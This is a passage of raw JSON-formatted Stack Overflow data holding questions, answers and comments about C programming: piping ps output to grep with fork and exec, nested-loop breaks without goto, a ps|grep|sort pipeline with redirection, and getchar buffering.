{"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1461796433, "post_id": 36899748, "comment_id": 61368297, "body": "@Ctx It is very similar, what I try to do is the other way around. In this post <code>grep</code> does not receive from the pipe (just sends), and that is exactly my problem."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1461796635, "post_id": 36899748, "comment_id": 61368366, "body": "@Nevado Replace <code>wc</code> in the linked post with your <code>grep</code>and the <code>grep</code> there with your <code>ps -ef</code> and you should be there"}, {"owner": {"reputation": 164, "user_id": 6193510, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-dRTC5khvm-g/AAAAAAAAAAI/AAAAAAAAFK0/nKLXuPE-F5Y/photo.jpg?sz=128", "display_name": "Nevado", "link": "https://stackoverflow.com/users/6193510/nevado"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1461797180, "post_id": 36899748, "comment_id": 61368591, "body": "@Ctx I will try it right now and tell you the results, thank you man."}, {"owner": {"reputation": 164, "user_id": 6193510, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-dRTC5khvm-g/AAAAAAAAAAI/AAAAAAAAFK0/nKLXuPE-F5Y/photo.jpg?sz=128", "display_name": "Nevado", "link": "https://stackoverflow.com/users/6193510/nevado"}, "edited": false, "score": 0, "creation_date": 1461798117, "post_id": 36899748, "comment_id": 61368871, "body": "I used it in a little test and it works perfectly :) Thank you a lot."}, {"owner": {"reputation": 164, "user_id": 6193510, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-dRTC5khvm-g/AAAAAAAAAAI/AAAAAAAAFK0/nKLXuPE-F5Y/photo.jpg?sz=128", "display_name": "Nevado", "link": "https://stackoverflow.com/users/6193510/nevado"}, "edited": false, "score": 0, "creation_date": 1461798479, "post_id": 36899748, "comment_id": 61368967, "body": "Btw, I just realized my pipes code was fine, it freezes in the final for loop."}], "owner": {"reputation": 164, "user_id": 6193510, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-dRTC5khvm-g/AAAAAAAAAAI/AAAAAAAAFK0/nKLXuPE-F5Y/photo.jpg?sz=128", "display_name": "Nevado", "link": "https://stackoverflow.com/users/6193510/nevado"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 40, "favorite_count": 0, "closed_date": 1461798134, "answer_count": 0, "score": 0, "last_activity_date": 1461793787, "creation_date": 1461787192, "last_edit_date": 1461793787, "question_id": 36899748, "link": "https://stackoverflow.com/questions/36899748/using-grep-in-exec-in-c", "closed_reason": "Duplicate", "title": "Using grep in exec() in c", "body": "<p>I am trying to make a function that gets the information about  the process that  executes it. Basically I have to execut <code>ps -ef</code> then filter the results with <code>grep (the pid of the process)</code>. The problem is that I have to do this using <code>exec</code>, it  would be quite easy with <code>ps -ef | grep pid</code>.\nFor the moment I am able to pass the result of <code>ps</code> to the parent process but I do not know how to put it into <code>grep</code>. </p>\n\n<p>In this code I tried to put the output of <code>ps</code> as the <code>stdin</code> of <code>grep</code>, but quite frankly, I have no clue of what I am doing. Should I just take what I get from the pipe and pass it somehow to <code>grep</code>?</p>\n\n<p>Here is the code:</p>\n\n<pre><code>    int main(){\n\n        /*Variables*/\n        int fd[2][2];\n        int cpid[2];\n\n        char spid[10];\n\n        int maxbuf=10000;\n        char buffer[maxbuf];\n\n        char ch;\n\n        int count;\n/********************/\n        sprintf(spid,\"%d\", getpid());\n        printf(\"%s\\n\", spid);\n\n        if(pipe(fd[0])==-1){\n            perror(\"Pipe error\");\n            exit(EXIT_FAILURE);\n        }\n        cpid[0]=fork();    \n        switch(cpid[0]){\n            case -1:\n                perror(\"Fork error\");\n                exit(EXIT_FAILURE);\n            case 0:\n                if(pipe(fd[1])==-1){\n                    perror(\"Pipe error\");\n                    exit(EXIT_FAILURE);\n                }\n                cpid[1]=fork();\n                switch(cpid[1]){\n                    case -1:\n                        perror(\"Fork error\");\n                        exit(EXIT_FAILURE);\n                    case 0:\n\n\n                        close(fd[1][0]);\n                        close(1);\n                        dup(fd[1][1]);\n                        //sleep(1);\n                        //wait(NULL);\n                        execlp(\"ps\",\"ps\",\"-ef\",(char *)0);\n                        perror(\"Error in ps command\");\n                        exit(EXIT_FAILURE);\n\n                    default:\n                        close(fd[1][1]);\n                        close(0);\n                        dup(fd[1][0]);\n\n                        close(fd[0][0]);\n                        close(1);\n                        dup(fd[0][1]);\n                        //sleep(1);\n                        //wait(NULL);\n                        execlp(\"grep\",\"grep\", spid, (char *)0);\n                        perror(\"Error in grep command\");\n                        exit(EXIT_FAILURE);\n                }\n            default:\n                for (count=0;read(fd[0][0], &amp;ch,1)==1 &amp;&amp; count&lt;maxbuf; count++){\n                    buffer[count]=ch;\n                }\n\n        }\n\n\n\n        exit(EXIT_SUCCESS);\n\n    }\n</code></pre>\n\n<p>What I get from this code does when executed is: it prints the number of the parent process and the freezes. If I use <code>pstree</code> with the pid of the process\nI see <code>test\u2500\u2500\u2500grep</code> which means if freezes on <code>grep</code> (correct me if I am wrong)\nI know there are some crapy parts like the <code>buffer[maxbuff]</code>, but I want to focus on the <code>grep</code> issue.</p>\n\n<p>Any help is appreciated, thank you.</p>\n"}, {"tags": ["c++", "c", "for-loop"], "comments": [{"owner": {"reputation": 61304, "user_id": 4117728, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/66831ed13ffd9c497541220ec45c15c3?s=128&d=identicon&r=PG&f=1", "display_name": "largest_prime_is_463035818", "link": "https://stackoverflow.com/users/4117728/largest-prime-is-463035818"}, "edited": false, "score": 3, "creation_date": 1461787584, "post_id": 36899735, "comment_id": 61363873, "body": "use <code>break</code> instead of <code>goto</code>  ?"}, {"owner": {"reputation": 8388, "user_id": 5890227, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/M6Of5.png?s=128&g=1", "display_name": "Khalil Khalaf", "link": "https://stackoverflow.com/users/5890227/khalil-khalaf"}, "edited": false, "score": 1, "creation_date": 1461787650, "post_id": 36899735, "comment_id": 61363910, "body": "State Machine design? implement states on every loop and check to use continue(s) and/or break(s)"}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1461787699, "post_id": 36899735, "comment_id": 61363936, "body": "make all of the conditionals in the nested loops false (according to the number you want to break out of), then break from the inner-most loop. You have no code after the check here, but be advised any code after this in &quot;parent&quot; loops would execute one more time before breaking."}, {"owner": {"reputation": 61304, "user_id": 4117728, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/66831ed13ffd9c497541220ec45c15c3?s=128&d=identicon&r=PG&f=1", "display_name": "largest_prime_is_463035818", "link": "https://stackoverflow.com/users/4117728/largest-prime-is-463035818"}, "edited": false, "score": 0, "creation_date": 1461787752, "post_id": 36899735, "comment_id": 61363963, "body": "btw there is nothing inherently wrong with goto, it just leads to extremly messy code in most cases, but you dont have to write messy code just to avoid <code>goto</code>"}, {"owner": {"reputation": 178960, "user_id": 2079303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cf7f63e49a75376e0f761c8abeb6d5a?s=128&d=identicon&r=PG", "display_name": "eerorika", "link": "https://stackoverflow.com/users/2079303/eerorika"}, "edited": false, "score": 0, "creation_date": 1461787938, "post_id": 36899735, "comment_id": 61364084, "body": "Breaking out of nested loops is one of the remaining cases where <code>goto</code> is the cleanest solution."}, {"owner": {"reputation": 365, "user_id": 1561663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5702679472b548e01cd2d6738c42d82?s=128&d=identicon&r=PG", "display_name": "joelw", "link": "https://stackoverflow.com/users/1561663/joelw"}, "edited": false, "score": 0, "creation_date": 1461787988, "post_id": 36899735, "comment_id": 61364110, "body": "The <code>goto nj</code> is simply a <code>break</code>."}, {"owner": {"reputation": 61304, "user_id": 4117728, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/66831ed13ffd9c497541220ec45c15c3?s=128&d=identicon&r=PG&f=1", "display_name": "largest_prime_is_463035818", "link": "https://stackoverflow.com/users/4117728/largest-prime-is-463035818"}, "reply_to_user": {"reputation": 365, "user_id": 1561663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5702679472b548e01cd2d6738c42d82?s=128&d=identicon&r=PG", "display_name": "joelw", "link": "https://stackoverflow.com/users/1561663/joelw"}, "edited": false, "score": 0, "creation_date": 1461788056, "post_id": 36899735, "comment_id": 61364154, "body": "@joelw and under the hood a <code>break</code> is simply a <code>goto</code> ;)"}, {"owner": {"reputation": 365, "user_id": 1561663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5702679472b548e01cd2d6738c42d82?s=128&d=identicon&r=PG", "display_name": "joelw", "link": "https://stackoverflow.com/users/1561663/joelw"}, "reply_to_user": {"reputation": 61304, "user_id": 4117728, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/66831ed13ffd9c497541220ec45c15c3?s=128&d=identicon&r=PG&f=1", "display_name": "largest_prime_is_463035818", "link": "https://stackoverflow.com/users/4117728/largest-prime-is-463035818"}, "edited": false, "score": 0, "creation_date": 1461788390, "post_id": 36899735, "comment_id": 61364361, "body": "@tobi303 Absolutely, but if you are trying to break out of the innermost loop, <code>break</code> is clearer."}, {"owner": {"reputation": 61304, "user_id": 4117728, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/66831ed13ffd9c497541220ec45c15c3?s=128&d=identicon&r=PG&f=1", "display_name": "largest_prime_is_463035818", "link": "https://stackoverflow.com/users/4117728/largest-prime-is-463035818"}, "reply_to_user": {"reputation": 365, "user_id": 1561663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5702679472b548e01cd2d6738c42d82?s=128&d=identicon&r=PG", "display_name": "joelw", "link": "https://stackoverflow.com/users/1561663/joelw"}, "edited": false, "score": 0, "creation_date": 1461788605, "post_id": 36899735, "comment_id": 61364484, "body": "@joelw he doesnt want to break out of the innermost loop only, but conditionally also out of some of the outer ones. Imho the original code is much clearer than the accepted answer (nevertheless I think it is a good answer to the question, given that <code>goto</code> is not wanted)."}, {"owner": {"reputation": 1989, "user_id": 1040315, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/RKlgf.jpg?s=128&g=1", "display_name": "theWalker", "link": "https://stackoverflow.com/users/1040315/thewalker"}, "reply_to_user": {"reputation": 61304, "user_id": 4117728, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/66831ed13ffd9c497541220ec45c15c3?s=128&d=identicon&r=PG&f=1", "display_name": "largest_prime_is_463035818", "link": "https://stackoverflow.com/users/4117728/largest-prime-is-463035818"}, "edited": false, "score": 0, "creation_date": 1461788874, "post_id": 36899735, "comment_id": 61364640, "body": "@tobi303, you right, goto in this case is most simply and clean solution. I don&#39;t like break in multiple loops from old compilers, where sometimes break breaks over two for()"}], "answers": [{"comments": [{"owner": {"reputation": 61304, "user_id": 4117728, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/66831ed13ffd9c497541220ec45c15c3?s=128&d=identicon&r=PG&f=1", "display_name": "largest_prime_is_463035818", "link": "https://stackoverflow.com/users/4117728/largest-prime-is-463035818"}, "edited": false, "score": 0, "creation_date": 1461787906, "post_id": 36899925, "comment_id": 61364059, "body": "I dont really agree that &quot;break cant help&quot;. He could use a flag to kind of forward the break to the outer loops. Whether this would be better than <code>goto</code> is a different question."}, {"owner": {"reputation": 1884, "user_id": 3078414, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/b1180f5e68d3542488d66de14ff53964?s=128&d=identicon&r=PG&f=1", "display_name": "user3078414", "link": "https://stackoverflow.com/users/3078414/user3078414"}, "edited": false, "score": 0, "creation_date": 1461836914, "post_id": 36899925, "comment_id": 61384457, "body": "I don&#39;t quite agree with respect to &quot;break can&#39;t help&quot;, or &quot;break can help&quot;. Perhaps it&#39;s also a matter of wording and pragmatism. I dare say  I&#39;ve seen examples of good programming practice using <code>goto</code> for breaking out of multiple nested loops and it is perhaps one of two scenarios I&#39;m also using a <code>goto</code> in C. Although I understand this does not answer the question, using a <code>break</code> whenever one can achieve the goal without overtaxing the code by declaring, setting, checking against and resetting additional variables, flags, etc. is the best solution."}], "tags": [], "owner": {"reputation": 539, "user_id": 6136013, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9dfd7585752c56c5272150aa4fead686?s=128&d=identicon&r=PG&f=1", "display_name": "BlindDriver", "link": "https://stackoverflow.com/users/6136013/blinddriver"}, "is_accepted": false, "score": 2, "last_activity_date": 1461787802, "creation_date": 1461787802, "answer_id": 36899925, "question_id": 36899735, "link": "https://stackoverflow.com/questions/36899735/c-multi-loop-for-basics/36899925#36899925", "title": "C multi-loop for() basics", "body": "<p><code>goto nj</code> can be replaced with <code>break</code>. however, <code>break</code> can't help you if you need to break out of nested loops. I think this is a perfectly legit use case for <code>goto</code>. The only alternative I can think of is to sett the loop counter outside of its range, e.g. <code>c = cmax(j)</code>. Worse than <code>goto</code>, in my opinion.</p>\n"}, {"tags": [], "owner": {"reputation": 5548, "user_id": 5068056, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/m53CE.jpg?s=128&g=1", "display_name": "Farhad", "link": "https://stackoverflow.com/users/5068056/farhad"}, "is_accepted": true, "score": 2, "last_activity_date": 1461789120, "last_edit_date": 1461789120, "creation_date": 1461787836, "answer_id": 36899939, "question_id": 36899735, "link": "https://stackoverflow.com/questions/36899735/c-multi-loop-for-basics/36899939#36899939", "title": "C multi-loop for() basics", "body": "<p>check this code: </p>\n\n<pre><code>    bool flag = false;\n    for(i=0;i&lt;imax;i++)\n    {   for(j=0;j&lt;jmax(i);j++)\n        {   for(c=0;c&lt;cmax(j);c++)\n            {   if(!check1(c))\n                {    if(check2()) {flag=true;break;}// goes to ni\n                     else break; //goes to nj\n                }\n            }\n            if(flag){flag=false; break;}\n            nj:;\n        }\n        // procedure\n    ni:;\n    }\n</code></pre>\n"}], "owner": {"reputation": 1989, "user_id": 1040315, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/RKlgf.jpg?s=128&g=1", "display_name": "theWalker", "link": "https://stackoverflow.com/users/1040315/thewalker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1283, "favorite_count": 0, "accepted_answer_id": 36899939, "answer_count": 2, "score": 1, "last_activity_date": 1461789120, "creation_date": 1461787147, "last_edit_date": 1461788513, "question_id": 36899735, "link": "https://stackoverflow.com/questions/36899735/c-multi-loop-for-basics", "title": "C multi-loop for() basics", "body": "<p>How to write example code without goto and without additional procedure call?</p>\n\n<pre><code>for(i=0;i&lt;imax;i++)\n{   for(j=0;j&lt;jmax(i);j++)\n    {   for(c=0;c&lt;cmax(j);c++)\n        {   if(!check1(c))\n            {    if(check2()) goto ni;\n                 else goto nj;\n            }\n        }\n    // **EDIT** procedure call is here\nnj:;\n    }\nni:;\n}\n</code></pre>\n"}, {"tags": ["c", "command", "pipe"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1461788044, "post_id": 36899631, "comment_id": 61364147, "body": "There are hundreds of questions in SO about how to implement pipelines in C, as well as many off-site tutorials. I don&#39;t see evidence that you&#39;ve done any research on this yourself."}, {"owner": {"reputation": 225, "user_id": 5615653, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/dd7320ed0d639a25da3db1de99a25ff3?s=128&d=identicon&r=PG&f=1", "display_name": "magalenyo", "link": "https://stackoverflow.com/users/5615653/magalenyo"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1461788398, "post_id": 36899631, "comment_id": 61364366, "body": "@Barmar k bro, what about this...  int main(){  \tint pipe0[2], pipe1[2], pid0, pid1; \t \tpipe(pipe0); \tpid0 = fork();\t \tif (pid == 0){\t \t\tclose(1); \t\tdup(pipe0); \t\tfd_fitxer = open(\u201c./out.txt\u201d, O_WRONLY | O_CREAT | O_TRUNC, 00600); \t\texecl(&quot;sort&quot;,&quot;-nk2&quot;,&quot;&gt;fd_fitxer&quot;); \t\tpipe(pipe1); \t\tpid1 = fork(); \t\tif (pid1 == 0){\t\t \t\t\tclose(1); \t\t\tdup(pipe1); \t\t\t \t\t} \t\t \t} \telse if (pid == -1){ \t\tperror(&quot;ERROR AL SORT!\\n&quot;); \t\texit(1); \t} \tclose(1);\t//tancar entrada \tdup(fd0); \t \treturn 0; }   This is what I have, but still have no idea on how to keep on going."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1461788541, "post_id": 36899631, "comment_id": 61364444, "body": "What about it? SO is not a coding service. You need to make an attempt to solve it yourself. If you can&#39;t get it working, post your code and we&#39;ll help you understand where you went wrong and how to fix it."}], "answers": [{"comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1461788081, "post_id": 36899904, "comment_id": 61364170, "body": "I suspect this is homework in a class where he&#39;s supposed to make the pipes himself, not just execute the whole thing with a shell."}], "tags": [], "owner": {"reputation": 8071, "user_id": 5230735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97305d39e366bd0cf7e0e9bf5b19c179?s=128&d=identicon&r=PG&f=1", "display_name": "ralf htp", "link": "https://stackoverflow.com/users/5230735/ralf-htp"}, "is_accepted": false, "score": 1, "last_activity_date": 1461788997, "last_edit_date": 1495541770, "creation_date": 1461787737, "answer_id": 36899904, "question_id": 36899631, "link": "https://stackoverflow.com/questions/36899631/piping-the-output-of-a-command-as-an-input-of-another-in-c/36899904#36899904", "title": "Piping the output of a command as an input of another in C", "body": "<p>You can execute shell commands in C programs <em>directly</em> using <code>sh -c</code> </p>\n\n<p>(<a href=\"https://stackoverflow.com/questions/19209141/how-do-i-execute-a-shell-built-in-command-with-a-c-function\">How do I execute a Shell built-in command with a C function?</a>)</p>\n\n<p>Pipes can also be used in C programs directly using <code>popen()</code></p>\n\n<p>The following program example shows how to pipe the output of the <code>ps -A</code> command to the <code>grep init</code> command: <code>ps -A | grep init</code></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint\nmain ()\n{\n  FILE *ps_pipe;\n  FILE *grep_pipe;\n\n  int bytes_read;\n  int nbytes = 100;\n  char *my_string;\n\n  /* Open our two pipes */\n  ps_pipe = popen (\"ps -A\", \"r\");\n  grep_pipe = popen (\"grep init\", \"w\");\n\n  /* Check that pipes are non-null, therefore open */\n  if ((!ps_pipe) || (!grep_pipe))\n    {\n      fprintf (stderr,\n               \"One or both pipes failed.\\n\");\n      return EXIT_FAILURE;\n    }\n\n  /* Read from ps_pipe until two newlines */\n  my_string = (char *) malloc (nbytes + 1);\n  bytes_read = getdelim (&amp;my_string, &amp;nbytes, \"\\n\\n\", ps_pipe);\n\n  /* Close ps_pipe, checking for errors */\n  if (pclose (ps_pipe) != 0)\n    {\n      fprintf (stderr,\n               \"Could not run 'ps', or other error.\\n\");\n    }\n\n  /* Send output of 'ps -A' to 'grep init', with two newlines */\n  fprintf (grep_pipe, \"%s\\n\\n\", my_string);\n\n  /* Close grep_pipe, checking for errors */\n  if (pclose (grep_pipe) != 0)\n    {\n      fprintf (stderr,\n               \"Could not run 'grep', or other error.\\n\");\n    }\n\n  /* Exit! */\n  return 0;\n}\n</code></pre>\n\n<p><em>source</em>: <a href=\"http://crasseux.com/books/ctutorial/Programming-with-pipes.html\" rel=\"nofollow noreferrer\">http://crasseux.com/books/ctutorial/Programming-with-pipes.html</a></p>\n\n<p>else use <em>named pipes</em> (<a href=\"https://en.wikipedia.org/wiki/Named_pipe\" rel=\"nofollow noreferrer\">https://en.wikipedia.org/wiki/Named_pipe</a>)\n<a href=\"http://www.cs.fredonia.edu/zubairi/s2k2/csit431/more_pipes.html\" rel=\"nofollow noreferrer\">http://www.cs.fredonia.edu/zubairi/s2k2/csit431/more_pipes.html</a></p>\n\n<p>See also this <a href=\"https://stackoverflow.com/questions/34010502/c-program-to-perform-a-pipe-on-three-commands?rq=1\">C program to perform a pipe on three commands</a> (uses <code>fork()</code>)</p>\n"}], "owner": {"reputation": 225, "user_id": 5615653, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/dd7320ed0d639a25da3db1de99a25ff3?s=128&d=identicon&r=PG&f=1", "display_name": "magalenyo", "link": "https://stackoverflow.com/users/5615653/magalenyo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1650, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1461788997, "creation_date": 1461786791, "question_id": 36899631, "link": "https://stackoverflow.com/questions/36899631/piping-the-output-of-a-command-as-an-input-of-another-in-c", "title": "Piping the output of a command as an input of another in C", "body": "<p>So, I have this command line I want to execute in C:</p>\n\n<pre><code>ps -eo user,pid,ppid 2&gt; log.txt | grep user 2&gt;&gt;log.txt | sort -nk2 &gt; out.txt\n</code></pre>\n\n<p>And I need to figure out how I'd make the code... fd\nWhat I understand is that I have the father ps... Which needs to redirect the output as an input to the grep, and it also needs to error output to log.txt...</p>\n\n<p>The same with the grep... the output must be redirected to the sort, and the error must be saved in log.txt.</p>\n\n<p>and I'd just output the sort to the file...</p>\n\n<p>Something like this:</p>\n\n<pre><code>FATHER(ps)               SON(grep)         SON-SON? (sort)\n\n0-&gt;must be closed  ----&gt; 0           ----&gt; 0\n                  /                 /\n1 ---------------/       1 --------/       1 --&gt;out.txt\n\n2 ---&gt; log.txt           2 ---&gt; log.txt    2 --&gt;nowhere?\n</code></pre>\n\n<p>But I don't know how this would be coded...\nI'd appreciate your help.</p>\n"}, {"tags": ["c", "printf", "getchar"], "comments": [{"owner": {"reputation": 7965, "user_id": 6242613, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/X5cUu.jpg?s=128&g=1", "display_name": "V. Sambor", "link": "https://stackoverflow.com/users/6242613/v-sambor"}, "edited": false, "score": 0, "creation_date": 1461786791, "post_id": 36899548, "comment_id": 61363374, "body": "printf has nothing to do with waiting behaviour... it is getchar(). but first try to clean your project and rebuild it...And try again."}, {"owner": {"reputation": 523, "user_id": 6250057, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1010949318993077/picture?type=large", "display_name": "Dogus Ural", "link": "https://stackoverflow.com/users/6250057/dogus-ural"}, "reply_to_user": {"reputation": 7965, "user_id": 6242613, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/X5cUu.jpg?s=128&g=1", "display_name": "V. Sambor", "link": "https://stackoverflow.com/users/6242613/v-sambor"}, "edited": false, "score": 0, "creation_date": 1461824643, "post_id": 36899548, "comment_id": 61376852, "body": "is there a way to disable the input buffer stream for getchar() ?"}], "answers": [{"comments": [{"owner": {"reputation": 523, "user_id": 6250057, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1010949318993077/picture?type=large", "display_name": "Dogus Ural", "link": "https://stackoverflow.com/users/6250057/dogus-ural"}, "edited": false, "score": 0, "creation_date": 1461823466, "post_id": 36899645, "comment_id": 61376259, "body": "what does this have to do with me being have to press enter everytime i want something printed. I dont understand your explanation"}, {"owner": {"reputation": 2639, "user_id": 3072566, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jaZNV.png?s=128&g=1", "display_name": "litelite", "link": "https://stackoverflow.com/users/3072566/litelite"}, "reply_to_user": {"reputation": 523, "user_id": 6250057, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1010949318993077/picture?type=large", "display_name": "Dogus Ural", "link": "https://stackoverflow.com/users/6250057/dogus-ural"}, "edited": false, "score": 0, "creation_date": 1461959403, "post_id": 36899645, "comment_id": 61451289, "body": "@DogusUral It means that the <code>getchar</code> in the condition of your loop is blocking until you press enter, the <code>printf</code> is never executed until you press enter."}], "tags": [], "owner": {"reputation": 2639, "user_id": 3072566, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jaZNV.png?s=128&g=1", "display_name": "litelite", "link": "https://stackoverflow.com/users/3072566/litelite"}, "is_accepted": true, "score": 5, "last_activity_date": 1461959518, "last_edit_date": 1461959518, "creation_date": 1461786834, "answer_id": 36899645, "question_id": 36899548, "link": "https://stackoverflow.com/questions/36899548/printf-waiting-for-enter/36899645#36899645", "title": "Printf waiting for enter", "body": "<p><code>printf</code> is not waiting it is <code>getchar</code> instead. <code>getchar</code> uses a buffer behind the scene. When that buffer is empty, <code>getchar</code> will read 1 line from stdin and <strong>then</strong> return the first caracter. If it is not empty, it will return the next caracter from the buffer immediatly.</p>\n\n<p>That means that the <code>getchar</code> will wait the first time you call it. And thus your <code>printf</code> is never executed until you press <code>enter</code></p>\n"}], "owner": {"reputation": 523, "user_id": 6250057, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1010949318993077/picture?type=large", "display_name": "Dogus Ural", "link": "https://stackoverflow.com/users/6250057/dogus-ural"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 338, "favorite_count": 0, "accepted_answer_id": 36899645, "answer_count": 1, "score": 0, "last_activity_date": 1461959518, "creation_date": 1461786477, "last_edit_date": 1461787184, "question_id": 36899548, "link": "https://stackoverflow.com/questions/36899548/printf-waiting-for-enter", "title": "Printf waiting for enter", "body": "<pre><code>int kr=0;\nint ss =0;\nwhile ((kr=getchar()) != EOF){\n      if(kr != '\\n')\n      {\n        ss++;\n      }\n\n      printf(\"%d\\n\",ss);\n}\n</code></pre>\n\n<p>With this code , printf is waiting until i press enter then printing all the sequential ss values at the same time like in this </p>\n\n<p><a href=\"https://i.stack.imgur.com/kocPF.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/kocPF.png\" alt=\"enter image description here\"></a></p>\n\n<p>.  Can somebody explain this behavior ?</p>\n"}, {"tags": ["c++", "c", "calculator"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1461786038, "post_id": 36899417, "comment_id": 61362915, "body": "Read more about data types and their representations."}, {"owner": {"reputation": 8388, "user_id": 5890227, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/M6Of5.png?s=128&g=1", "display_name": "Khalil Khalaf", "link": "https://stackoverflow.com/users/5890227/khalil-khalaf"}, "edited": false, "score": 4, "creation_date": 1461786060, "post_id": 36899417, "comment_id": 61362929, "body": "Every data type has a specific range of values which is limited."}, {"owner": {"reputation": 18435, "user_id": 845568, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c4f2f13bd99d95ae2ee2249e9b1b8731?s=128&d=identicon&r=PG", "display_name": "Captain Obvlious", "link": "https://stackoverflow.com/users/845568/captain-obvlious"}, "edited": false, "score": 0, "creation_date": 1461786169, "post_id": 36899417, "comment_id": 61362985, "body": "<i>&quot;What causes my calculator written in C/C++ to give these wrong answers with big numbers?&quot;</i> - The problem is caused by a bug in your code. Although I&#39;m a bit skeptical there&#39;s any code since there is no language called <i>C/C++</i>"}, {"owner": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461786184, "post_id": 36899417, "comment_id": 61362996, "body": "There are no built-in data types for arbitrary-precision calculations, but you can certainly roll your own. Look at Java&#39;s <code>java.math.BigDecimal</code>, for instance."}, {"owner": {"reputation": 1769, "user_id": 3471712, 